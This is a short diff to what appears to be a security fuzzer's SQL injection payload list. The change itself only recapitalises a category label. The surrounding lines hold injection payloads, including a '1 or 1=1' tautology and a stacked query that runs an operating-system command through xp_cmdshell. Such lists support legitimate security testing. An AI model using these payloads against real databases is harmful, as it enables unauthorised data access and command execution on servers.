@@ -84,7 +84,7 @@ x' or full_name like '%bob%
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 
 P:005-SQL-INJ:MySQL Injection 101:4
-> Replacive Fuzzers | SQL injection | Injection
+> Replacive Fuzzers | SQL Injection | Injection
 >>This is a comment line to be changed in the future
 a
 1 or 1=1
